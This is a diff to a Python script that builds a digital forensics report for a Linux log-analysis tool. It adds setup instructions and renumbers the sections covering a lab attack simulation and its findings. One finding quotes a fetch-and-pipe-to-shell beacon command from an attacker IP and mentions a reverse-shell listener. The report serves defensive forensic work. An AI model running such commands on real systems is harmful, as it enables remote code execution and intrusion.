@@ -214,115 +214,219 @@ def create_report():
                 if col_idx in (0, 3):
                     run.font.bold = True
 
-    # 3. Controlled Attack Simulation
-    add_sec_heading("3. Controlled Attack Simulation & Lab Recreation (mega_chain.sh)")
+    # 3. Tool Setup & Deployment Guide
+    add_sec_heading("3. Tool Setup & Deployment Guide")
+    doc.add_paragraph(
+        "LFA supports two deployment methods depending on operational constraints and the sensitivity of the investigation environment. "
+        "Method A supports connected developer triage, while Method B provides a zero-install, air-gapped portable kit."
+    )
+
+    add_sub_heading("Method A: Conventional Installation (Online / Developer Setup)")
+    doc.add_paragraph(
+        "For connected systems with Python 3.11+ installed, the tool is installed via repository clone and pip requirements:\n"
+        "  1. git clone https://github.com/internsdfir-hub/Linux-Forensics-system.git\n"
+        "  2. pip install -r requirements.txt\n"
+        "  3. python -m lfa --help"
+    )
+    add_fig("docs/report_images/setup_lfa_help.png", "Figure 3.1: Terminal output of python -m lfa --help displaying available CLI modes and positional arguments.")
+
+    modes_table = doc.add_table(rows=7, cols=3)
+    modes_table.alignment = WD_TABLE_ALIGNMENT.CENTER
+    modes_table.autofit = False
+
+    m_data = [
+        ("Mode", "Command Syntax", "Description & Forensic Purpose"),
+        ("Local Analysis", "python -m lfa analyse <bundle.tar.gz> --case-dir cases/<ID> --examiner \"<Name>\"", "Standard offline triage: unzips evidence, parses logs, executes 12 MITRE correlation rules, and builds offline HTML report."),
+        ("Central Server", "python -m lfa serve --host 0.0.0.0 --port 8443 --token \"<TOKEN>\"", "Starts streaming HTTP ingestion endpoint and serves the interactive SOC investigation web console."),
+        ("Remote Acquisition", "python -m lfa remote --host <IP> --user root --case-dir cases/<ID>", "Agentless acquisition: streams volatile state and disk artifacts over SSH in-memory without saving collector scripts to target disk."),
+        ("Integrity Verification", "python -m lfa verify cases/<ID>", "Recalculates cryptographic SHA-256 hashes of all ingested files against manifest.txt to verify chain of custody."),
+        ("Report Re-generation", "python -m lfa report cases/<ID> --out <report.html>", "Re-renders HTML report directly from the normalized SQLite database (case.db)."),
+        ("Dataset Export", "python -m lfa export cases/<ID> --out-dir exports/<ID>", "Serializes timeline events to canonical JSON and per-category CSVs for external SIEM ingestion.")
+    ]
+
+    for row_idx, row in enumerate(m_data):
+        r = modes_table.rows[row_idx]
+        for col_idx, text in enumerate(row):
+            c = r.cells[col_idx]
+            c.width = Inches(1.4) if col_idx == 0 else (Inches(2.5) if col_idx == 1 else Inches(2.9))
+            set_cell_margins(c, 70, 70, 90, 90)
+            if row_idx == 0:
+                set_cell_background(c, "0F2C59")
+                p = c.paragraphs[0]
+                run = p.add_run(text)
+                run.font.bold = True
+                run.font.color.rgb = RGBColor(0xFF, 0xFF, 0xFF)
+                run.font.size = Pt(9.0)
+            else:
+                set_cell_background(c, "F8FAFC" if row_idx % 2 == 1 else "FFFFFF")
+                p = c.paragraphs[0]
+                run = p.add_run(text)
+                run.font.size = Pt(8.5)
+                if col_idx == 0:
+                    run.font.bold = True
+
+    add_sub_heading("Method B: LFA-Portable (Zero-Install / Air-Gapped / Field Deployment)")
+    doc.add_paragraph(
+        "Air-Gapped Demonstration Environment: To demonstrate an authentic forensic investigation workflow, "
+        "all subsequent analysis in this case was executed on a Windows 10 Virtual Machine completely isolated from the internet. "
+        "The VM was configured with zero network adapter connectivity (no internet access past or present). "
+        "The standalone LFA-Portable.zip package and raw evidence bundle (bundle.tar.gz) were transferred offline into the VM "
+        "via local host-to-guest shared media. The portable archive was extracted to C:\\Users\\me\\Downloads\\LFA-Portable\\LFA-Portable\\, "
+        "and the entire analysis, integrity verification, report generation, and SOC console review were executed exclusively within this isolated environment."
+    )
+    add_fig("docs/report_images/setup_portable_folder.png", "Figure 3.2: Isolated Windows 10 VM showing network disconnection (ipconfig) alongside extracted LFA-Portable directory structure.")
+
+    doc.add_paragraph(
+        "Step 1: Verify Environment & Runtime Integrity\n"
+        "Command: verify-install.cmd\n"
+        "Tests the embedded CPython 3.13.7 runtime, validates cryptographic libraries (ssl, hashlib), database engines (sqlite3), "
+        "and confirms 598 available timezones without contacting any external network."
+    )
+    add_fig("docs/report_images/setup_verify_install.png", "Figure 3.3: Execution of verify-install.cmd verifying embedded CPython 3.13.7, SQLite, SSL, and parsing libraries.")
+
+    doc.add_paragraph(
+        "Step 2: Execute Ingestion & Threat Correlation Pipeline\n"
+        "Command: lfa.cmd analyse cases\\wsl_enterprise\\bundle.tar.gz --case-dir cases\\CASE-ENTERPRISE-SIM --examiner \"Fahad\"\n"
+        "Command Syntax & Parameter Breakdown:\n"
+        "  • lfa.cmd: Windows Command launcher directing execution to the isolated runtime\\python.exe without modifying system PATH.\n"
+        "  • analyse: Master pipeline command that unpacks bundle, verifies SHA-256 hashes against manifest.txt, parses 22+ log formats, evaluates 12 correlation rules, and builds SQLite case DB + HTML report.\n"
+        "  • cases\\wsl_enterprise\\bundle.tar.gz: Path to the raw collected forensic evidence archive.\n"
+        "  • --case-dir: Working directory for SQLite database (case.db), HTML report (report.html), and canonical exports.\n"
+        "  • --examiner: Assigns investigator attribution and chain-of-custody metadata."
+    )
+    add_fig("docs/report_images/setup_portable_analyse.png", "Figure 3.4: Terminal execution of lfa.cmd analyse showing 154 files verified, 47 threat findings recorded, and canonical exports saved.")
+
+    doc.add_paragraph(
+        "Step 3: Launch Local SOC Dashboard Console\n"
+        "Command: lfa-dashboard.cmd\n"
+        "Command Syntax & Operational Breakdown:\n"
+        "  • lfa-dashboard.cmd: Batch launcher invoking python -m lfa serve bound strictly to loopback (127.0.0.1:8443).\n"
+        "  • Security Boundary: Because it binds exclusively to 127.0.0.1, the server never exposes ports or listens on external network interfaces.\n"
+        "  • Auto-Discovery: Indexes all case databases residing in the cases/ folder."
+    )
+    add_fig("docs/report_images/setup_dashboard_server.png", "Figure 3.5: Local SOC dashboard server console running on loopback http://127.0.0.1:8443.")
+
+    doc.add_paragraph(
+        "Step 4: Interactive Browser Investigation\n"
+        "Navigate to http://127.0.0.1:8443 in any web browser to explore global case metrics, alert summaries, and normalized events."
+    )
+    add_fig("docs/report_images/setup_soc_dashboard.png", "Figure 3.6: Web console in browser displaying Case CASE-ENTERPRISE-SIM loaded with 62,117 events and 27 High-severity alerts.")
+
+    doc.add_paragraph(
+        "Continuing This Investigation: LFA-Portable Method\n"
+        "All subsequent analysis, evidence extraction, timeline correlation, and threat verification documented in Sections 4 through 16 "
+        "were executed using this portable, air-gapped setup."
+    )
+
+    # 4. Controlled Attack Simulation
+    add_sec_heading("4. Controlled Attack Simulation & Lab Recreation (mega_chain.sh)")
     doc.add_paragraph(
         "To test the tool in a controlled environment with verifiable ground truth, the multi-stage attack scenario "
         "testlab/scenarios/mega_chain.sh was executed on a snapshotted Linux enterprise instance."
     )
-    add_fig("docs/report_images/image2.png", "Figure 3.1: Execution of mega_chain.sh showing benign employee noise generation (Phase 1) and external SSH brute force (Phase 2).")
-    add_fig("docs/report_images/image3.png", "Figure 3.2: Execution log showing creation of hidden UID-0 root account (sysmon), rogue sudoers drop, and dynamic linker preload hooks.")
-    add_fig("docs/report_images/image4.png", "Figure 3.3: Execution of exfiltration staging, simulated USB drive theft, shell history wiping, and ground truth compilation.")
-    add_fig("docs/report_images/image5.png", "Figure 3.4: Simulation summary documenting the 17 verified ground-truth indicators and operational execution commands.")
+    add_fig("docs/report_images/image2.png", "Figure 4.1: Execution of mega_chain.sh showing benign employee noise generation (Phase 1) and external SSH brute force (Phase 2).")
+    add_fig("docs/report_images/image3.png", "Figure 4.2: Execution log showing creation of hidden UID-0 root account (sysmon), rogue sudoers drop, and dynamic linker preload hooks.")
+    add_fig("docs/report_images/image4.png", "Figure 4.3: Execution of exfiltration staging, simulated USB drive theft, shell history wiping, and ground truth compilation.")
+    add_fig("docs/report_images/image5.png", "Figure 4.4: Simulation summary documenting the 17 verified ground-truth indicators and operational execution commands.")
 
-    # 4. Live Evidence Collection
-    add_sec_heading("4. Live Forensic Acquisition & Chain of Custody (collect.sh)")
+    # 5. Live Evidence Collection
+    add_sec_heading("5. Live Forensic Acquisition & Chain of Custody (collect.sh)")
     doc.add_paragraph(
         "In compliance with RFC 3227 standards, evidence was collected live using collector/collect.sh. "
         "Volatile state was captured first, and all disk files were stat'd and hashed before copying. "
         "A total of 109 tar archives and manifests were generated."
     )
-    add_fig("docs/report_images/image6.png", "Figure 4.1: Live acquisition execution showing file count (109) and SHA-256 bundle hash (2a79bb10...).")
-    add_fig("docs/report_images/image7.png", "Figure 4.2: Evidence directory in cases/wsl_enterprise showing bundle.tar.gz and hash manifests.")
+    add_fig("docs/report_images/image6.png", "Figure 5.1: Live acquisition execution showing file count (109) and SHA-256 bundle hash (2a79bb10...).")
+    add_fig("docs/report_images/image7.png", "Figure 5.2: Evidence directory in cases/wsl_enterprise showing bundle.tar.gz and hash manifests.")
 
-    # 5. Portable Deployment
-    add_sec_heading("5. Portable Deployment Architecture (LFA-Portable)")
+    # 6. Portable Deployment Architecture
+    add_sec_heading("6. Portable Deployment Architecture (LFA-Portable)")
     doc.add_paragraph(
         "To facilitate analysis on air-gapped workstations or field laptops without internet connectivity, "
         "the self-contained LFA-Portable distribution was utilized."
     )
-    add_fig("docs/report_images/image22.png", "Figure 5.1: File structure of LFA-Portable featuring embedded runtimes, batch launchers, and offline verification scripts.")
+    add_fig("docs/report_images/image22.png", "Figure 6.1: File structure of LFA-Portable featuring embedded runtimes, batch launchers, and offline verification scripts.")
 
-    # 6. Pipeline Ingestion & Normalization
-    add_sec_heading("6. Ingestion, Event Normalization & Threat Correlation")
+    # 7. Pipeline Ingestion & Normalization
+    add_sec_heading("7. Ingestion, Event Normalization & Threat Correlation")
     doc.add_paragraph(
         "Using LFA's analysis pipeline, 62,117 raw log events were converted into standardized "
         "NormalizedEvent objects and correlated across 14 deterministic MITRE ATT&CK rules."
     )
-    add_fig("docs/report_images/image11.png", "Figure 6.1: CLI analysis pipeline confirming 62,117 events parsed and 47 findings detected.")
-    add_fig("docs/report_images/image12.png", "Figure 6.2: Standalone Executive Forensic Examination Report dashboard (report.html).")
+    add_fig("docs/report_images/image11.png", "Figure 7.1: CLI analysis pipeline confirming 62,117 events parsed and 47 findings detected.")
+    add_fig("docs/report_images/image12.png", "Figure 7.2: Standalone Executive Forensic Examination Report dashboard (report.html).")
 
-    # 7. Chronological Incident Findings
-    add_sec_heading("7. Detailed Forensic Examination & Correlated Findings")
+    # 8. Chronological Incident Findings
+    add_sec_heading("8. Detailed Forensic Examination & Correlated Findings")
     doc.add_paragraph(
         "Forensic evidence validated Hypothesis 3: the target was compromised through an external "
         "brute-force foothold, followed by privileged persistence, and compounded by rogue insider data theft."
     )
 
-    add_sub_heading("7.1 External Brute-Force & Initial Foothold (Vector 1 & 2)")
+    add_sub_heading("8.1 External Brute-Force & Initial Foothold (Vector 1 & 2)")
     doc.add_paragraph(
         "At 2026-05-26 10:23 UTC, an external burst of failed SSH authentications from IP 203.0.113.9 "
         "culminated in a successful breach of account 'kali'. The volume histogram clearly isolates the attack spike."
     )
-    add_fig("docs/report_images/image16.png", "Figure 7.1: Offline SVG chart showing authentication failure spike matching password guessing.")
+    add_fig("docs/report_images/image16.png", "Figure 8.1: Offline SVG chart showing authentication failure spike matching password guessing.")
 
-    add_sub_heading("7.2 Privilege Escalation & Backdoor Accounts (Vector 5 & 6)")
+    add_sub_heading("8.2 Privilege Escalation & Backdoor Accounts (Vector 5 & 6)")
     doc.add_paragraph(
         "Immediately upon compromise, the adversary created backdoor accounts: rogue root account 'sysmon' "
         "(UID 0) and service account 'svc_backup'. Sudoers rules in /etc/sudoers.d/ were manipulated."
     )
-    add_fig("docs/report_images/image13.png", "Figure 7.2: Report observations highlighting immediate administrator privilege grants.")
-    add_fig("docs/report_images/image14.png", "Figure 7.3: Finding card for account creation and immediate administrator elevation.")
+    add_fig("docs/report_images/image13.png", "Figure 8.2: Report observations highlighting immediate administrator privilege grants.")
+    add_fig("docs/report_images/image14.png", "Figure 8.3: Finding card for account creation and immediate administrator elevation.")
 
-    add_sub_heading("7.3 Multi-Vector Persistence Installation (Vector 5)")
+    add_sub_heading("8.3 Multi-Vector Persistence Installation (Vector 5)")
     doc.add_paragraph(
         "Four layers of persistence were uncovered: an unauthorized SSH key in /root/.ssh/authorized_keys, "
         "an outbound beacon cron in /etc/cron.d/lfa_beacon, a dynamic linker rootkit hook in /etc/ld.so.preload, "
         "and interactive shell profile traps in /etc/profile.d/."
     )
-    add_fig("docs/report_images/image18.png", "Figure 7.4: Evidence manifest table verifying cron persistence artifacts and hash integrity.")
-    add_fig("docs/report_images/image19.png", "Figure 7.5: Cryptographic verification of sudoers, shadow, and user shell history files.")
+    add_fig("docs/report_images/image18.png", "Figure 8.4: Evidence manifest table verifying cron persistence artifacts and hash integrity.")
+    add_fig("docs/report_images/image19.png", "Figure 8.5: Cryptographic verification of sudoers, shadow, and user shell history files.")
 
-    add_sub_heading("7.4 Command Execution & C2 Beaconing (Vector 7)")
+    add_sub_heading("8.4 Command Execution & C2 Beaconing (Vector 7)")
     doc.add_paragraph(
         "The intruder executed automated reverse-shell payloads: 'curl -s http://203.0.113.9/beacon | /bin/sh'. "
         "Netstat and socket parsing confirmed network listener preparation on port 4444."
     )
-    add_fig("docs/report_images/image15.png", "Figure 7.6: Dual-layer finding card detailing suspicious C2 beacon execution.")
-    add_fig("docs/report_images/image10.png", "Figure 7.7: Sockets verification showing active reverse-shell listener configuration.")
+    add_fig("docs/report_images/image15.png", "Figure 8.6: Dual-layer finding card detailing suspicious C2 beacon execution.")
+    add_fig("docs/report_images/image10.png", "Figure 8.7: Sockets verification showing active reverse-shell listener configuration.")
 
-    add_sub_heading("7.5 Rogue Insider Activity & USB Exfiltration (Vector 3, 4 & 8)")
+    add_sub_heading("8.5 Rogue Insider Activity & USB Exfiltration (Vector 3, 4 & 8)")
     doc.add_paragraph(
         "Telemetry confirmed employee account 'insider' conducted 5 off-hours sessions, staged mock company files "
         "in /tmp/exfil_staging/, and transferred data to a newly attached USB storage device before safe unmount."
     )
-    add_fig("docs/report_images/image20.png", "Figure 7.8: Intelligence summary detailing 34 accounts, 83 sessions, and 175 SSH connections.")
-    add_fig("docs/report_images/image21.png", "Figure 7.9: Activity metrics tracking 294 shell history entries and 202 scheduled actions.")
+    add_fig("docs/report_images/image20.png", "Figure 8.8: Intelligence summary detailing 34 accounts, 83 sessions, and 175 SSH connections.")
+    add_fig("docs/report_images/image21.png", "Figure 8.9: Activity metrics tracking 294 shell history entries and 202 scheduled actions.")
 
-    add_sub_heading("7.6 Anti-Forensic Tampering")
+    add_sub_heading("8.6 Anti-Forensic Tampering")
     doc.add_paragraph(
         "To conceal evidence, the adversary truncated shell history files, zeroed out /var/log/btmp (0 bytes), "
         "and injected artificial backwards timestamps into syslog. LFA's monotonic journald correlation caught all discrepancies."
     )
-    add_fig("docs/report_images/image17.png", "Figure 7.10: Chronological normalized event stream displaying kernel parameters and system events.")
+    add_fig("docs/report_images/image17.png", "Figure 8.10: Chronological normalized event stream displaying kernel parameters and system events.")
 
-    # 8. SOC Console & Explorer
-    add_sec_heading("8. Central SOC Console & Deep Evidence Explorer (Port 8443)")
+    # 9. SOC Console & Explorer
+    add_sec_heading("9. Central SOC Console & Deep Evidence Explorer (Port 8443)")
     doc.add_paragraph(
         "Examiners reviewed evidence via LFA's Central Ingestion Server (http://127.0.0.1:8443). "
         "The interface enables instant search across accounts, exact raw log line verification, and artifact tree browsing."
     )
-    add_fig("docs/report_images/image23.png", "Figure 8.1: Starting the Central Forensic Ingestion Server on loopback port 8443.")
-    add_fig("docs/report_images/image24.png", "Figure 8.2: Central Ingestion Console displaying global case metrics and alert summaries.")
-    add_fig("docs/report_images/image25.png", "Figure 8.3: Forensic Cases overview showing host IDs, event counts, and severity badges.")
-    add_fig("docs/report_images/image1.png", "Figure 8.4: Evidence Explorer search interface with multi-field event filtering.")
-    add_fig("docs/report_images/image26.png", "Figure 8.5: Event modal exposing exact raw forensic log line and parser provenance.")
-    add_fig("docs/report_images/image27.png", "Figure 8.6: Deep inspection of privileged command executions with JSON serialization.")
-    add_fig("docs/report_images/image28.png", "Figure 8.7: Visual Artifact Tree displaying collected files and SHA-256 checksums.")
-    add_fig("docs/report_images/image29.png", "Figure 8.8: Correlated timeline matrix grouped by Privilege Escalation and Persistence.")
+    add_fig("docs/report_images/image23.png", "Figure 9.1: Starting the Central Forensic Ingestion Server on loopback port 8443.")
+    add_fig("docs/report_images/image24.png", "Figure 9.2: Central Ingestion Console displaying global case metrics and alert summaries.")
+    add_fig("docs/report_images/image25.png", "Figure 9.3: Forensic Cases overview showing host IDs, event counts, and severity badges.")
+    add_fig("docs/report_images/image1.png", "Figure 9.4: Evidence Explorer search interface with multi-field event filtering.")
+    add_fig("docs/report_images/image26.png", "Figure 9.5: Event modal exposing exact raw forensic log line and parser provenance.")
+    add_fig("docs/report_images/image27.png", "Figure 9.6: Deep inspection of privileged command executions with JSON serialization.")
+    add_fig("docs/report_images/image28.png", "Figure 9.7: Visual Artifact Tree displaying collected files and SHA-256 checksums.")
+    add_fig("docs/report_images/image29.png", "Figure 9.8: Correlated timeline matrix grouped by Privilege Escalation and Persistence.")
 
-    # 9. Comparison with Industry-Standard Tools (Task 3 Requirement)
-    add_sec_heading("9. Comparative Tool Evaluation (Task 3 Requirement)")
+    # 10. Comparison with Industry-Standard Tools (Task 3 Requirement)
+    add_sec_heading("10. Comparative Tool Evaluation (Task 3 Requirement)")
     doc.add_paragraph(
         "In accordance with Task 3, LFA was benchmarked against traditional industry-standard forensic methods:"
     )
@@ -361,8 +465,8 @@ def create_report():
                 if col_idx == 0:
                     run.font.bold = True
 
-    # 10. Root Cause Analysis
-    add_sec_heading("10. Root Cause Analysis (RCA)")
+    # 11. Root Cause Analysis
+    add_sec_heading("11. Root Cause Analysis (RCA)")
     rcas = [
         ("1. Unrestricted Public SSH Ingress:", " Absence of rate limiting (fail2ban) and MFA permitted automated credential stuffing from 203.0.113.9."),
         ("2. Permissive Sudo Configuration:", " Account 'kali' possessed unmonitored sudo privileges, allowing instant creation of UID-0 root accounts."),
@@ -375,8 +479,8 @@ def create_report():
         r_b.font.bold = True
         p.add_run(desc)
 
-    # 11. Corrective Actions
-    add_sec_heading("11. Corrective Actions & Strategic Hardening")
+    # 12. Corrective Actions
+    add_sec_heading("12. Corrective Actions & Strategic Hardening")
     actions = [
         "Immediate Containment: Isolate host, terminate rogue sessions, purge UID-0 account 'sysmon', delete /etc/ld.so.preload, and revoke rogue SSH keys.",
         "Authentication Hardening: Enforce key-only SSH with mandatory hardware MFA (FIDO2/YubiKey); disable password authentication globally.",
@@ -387,8 +491,8 @@ def create_report():
         p = doc.add_paragraph(act, style='List Bullet')
         p.paragraph_format.space_after = Pt(3)
 
-    # 12. Troubleshooting & Applied Solutions
-    add_sec_heading("12. Engineering Challenges, Troubleshooting & Applied Solutions")
+    # 13. Troubleshooting & Applied Solutions
+    add_sec_heading("13. Engineering Challenges, Troubleshooting & Applied Solutions")
     doc.add_paragraph(
         "During testing and validation, several technical hurdles were resolved, documenting critical engineering problem-solving:"
     )
@@ -406,18 +510,18 @@ def create_report():
         r_b.font.bold = True
         p.add_run(ch_desc)
 
-    add_fig("docs/report_images/image9.png", "Figure 12.1: Diagnostic ICMP ping reachability testing to verify network boundary enforcement.")
-    add_fig("docs/report_images/image8.png", "Figure 12.2: Command Prompt terminal session resolving command syntax and executing score detection scripts.")
+    add_fig("docs/report_images/image9.png", "Figure 13.1: Diagnostic ICMP ping reachability testing to verify network boundary enforcement.")
+    add_fig("docs/report_images/image8.png", "Figure 13.2: Command Prompt terminal session resolving command syntax and executing score detection scripts.")
 
-    # 13. Detection Scorecard
-    add_sec_heading("13. Automated Detection Scorecard & Benchmark Evaluation")
+    # 14. Detection Scorecard
+    add_sec_heading("14. Automated Detection Scorecard & Benchmark Evaluation")
     doc.add_paragraph(
         "Scoring analysis outputs against the ground-truth specification (testlab/scenarios/mega_chain.ground_truth.json) "
         "confirmed 100% detection of critical indicators with zero false positives against background noise."
     )
 
-    # 14. SOP
-    add_sec_heading("14. Standard Operating Procedure (SOP) Quick Reference")
+    # 15. SOP
+    add_sec_heading("15. Standard Operating Procedure (SOP) Quick Reference")
     sop_steps = [
         ("Step 1: Live Acquisition (Target Host):", " sudo sh collector/collect.sh -r / -o /tmp/lfa_evidence -c <CASE_ID> -p '<EXAMINER>' -V -z"),
         ("Step 2: Transfer & Hash Verification:", " Get-FileHash bundle.tar.gz -Algorithm SHA256"),
@@ -432,8 +536,8 @@ def create_report():
         r_b.font.bold = True
         p.add_run(s_desc)
 
-    # 15. Conclusion & Attestation
-    add_sec_heading("15. Conclusion & Investigator Attestation")
+    # 16. Conclusion & Attestation
+    add_sec_heading("16. Conclusion & Investigator Attestation")
     doc.add_paragraph(
         "The digital forensics investigation into Case CASE-ENTERPRISE-SIM conclusively established the entry vector, "
         "administrative hijacking, multi-vector persistence, and physical data exfiltration. The Linux Forensic Analyzer "
